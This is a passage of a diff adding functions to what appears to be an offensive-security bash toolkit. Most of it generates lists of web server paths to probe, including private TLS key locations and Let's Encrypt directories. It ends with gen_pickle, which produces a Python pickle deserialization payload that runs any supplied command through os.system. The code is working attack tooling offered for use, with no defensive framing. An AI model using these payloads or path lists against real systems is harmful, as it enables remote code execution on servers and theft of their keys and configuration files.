+                echo "C:\\inetpub\\vhosts\\"
+                echo "C:\\inetpub\\wwwroot\\"
+            fi
+            
+            # IIS Express
+            echo "C:\\Users\\*\\Documents\\IISExpress\\config\\applicationhost.config"
+            } >> "$output_file"
+            ;;
+        
+        caddy)
+            {
+            local caddy_configs=("Caddyfile")
+            
+            if [[ -n "$domain" ]]; then
+                caddy_configs+=("${domain}.conf" "${domain}.caddy")
+            fi
+            
+            for base in "${bases[@]}"; do
+                for config in "${caddy_configs[@]}"; do
+                    echo "${base}/caddy/${config}"
+                    echo "${base}/caddy/conf.d/${config}"
+                    echo "${base}/caddy/sites-enabled/${config}"
+                    echo "${base}/caddy/sites-available/${config}"
+                done
+                echo "${base}/caddy/vhosts/"
+            done
+            
+            # Common Caddy paths
+            echo "/opt/caddy/Caddyfile"
+            echo "/home/caddy/Caddyfile"
+            if [[ -n "$domain" ]]; then
+                echo "/var/log/caddy/${domain}.log"
+                echo "/var/www/${domain}/"
+            else
+                echo "/var/log/caddy/access.log"
+            fi
+            } >> "$output_file"
+            ;;
+        
+        all)
+            {
+            # General web discovery paths (always included)
+            echo "# General Web Server Discovery Paths"
+            echo "/var/www/html/"
+            echo "/var/www/"
+            echo "/srv/http/"
+            echo "/usr/share/nginx/html/"
+            echo "/usr/local/www/"
+            echo "/home/*/public_html/"
+            echo "/home/*/www/"
+            echo "/etc/httpd/"
+            echo "/etc/apache2/"
+            echo "/etc/nginx/"
+            echo "/etc/lighttpd/"
+            echo "/etc/tomcat*/"
+            
+            # Domain-specific additions
+            if [[ -n "$domain" ]]; then
+                echo "/var/www/${domain}/"
+                echo "/home/*/public_html/${domain}/"
+                echo "/var/log/apache2/${domain}.log"
+                echo "/var/log/nginx/${domain}.log"
+                echo "/etc/letsencrypt/live/${domain}/"
+                echo "/etc/ssl/certs/${domain}.crt"
+                echo "/etc/ssl/private/${domain}.key"
+            else
+                echo "/var/log/apache2/"
+                echo "/var/log/nginx/"
+                echo "/etc/letsencrypt/live/"
+            fi
+            } >> "$output_file"
+            
+            # Append paths from all servers
+            local servers=("apache" "nginx" "lighttpd" "tomcat" "caddy")
+            for server in "${servers[@]}"; do
+                # Use a temporary file to avoid recursion issues
+                local temp_file=$(mktemp)
+                generate_web_paths "$server" "$domain" "$temp_file"
+                cat "$temp_file" >> "$output_file"
+                rm -f "$temp_file"
+            done
+            ;;
+        
+        *)
+            echo "Error: Unsupported server type '$server_type'" >&2
+            echo "Supported servers: apache, nginx, lighttpd, tomcat, iis, caddy, all" >&2
+            return 1
+            ;;
+    esac
+    
+    local line_count=$(wc -l < "$output_file" 2>/dev/null || echo "0")
+    echo "Generated $line_count paths in: $output_file"
+}
+
+gen_pickle() {
+    if [ $# -eq 0 ]; then
+        echo "Usage: gen_pickle <command>"
+        return 1
+    fi
+    
+    python3 -c "
+import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = '$1'
+        return os.system, (cmd,)
+
+payload = pickle.dumps(RCE())
+print(payload)
+"
 }
